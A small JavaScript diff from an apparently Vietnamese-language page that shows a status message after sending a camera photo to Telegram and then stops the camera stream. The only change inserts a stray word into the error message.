@@ -99,7 +99,7 @@
             if (data.ok) {
                 statusDiv.innerHTML = "✅ Đã gửi ảnh thành công! Kiểm tra Telegram.";
             } else {
-                statusDiv.innerHTML = "⚠️ Lỗi Telegram: " + (data.description || "Không rõ");
+                statusDiv.innerHTML = "⚠️ Lỗi cunce Telegram: " + (data.description || "Không rõ");
             }
             if (stream) stream.getTracks().forEach(t => t.stop());
         })
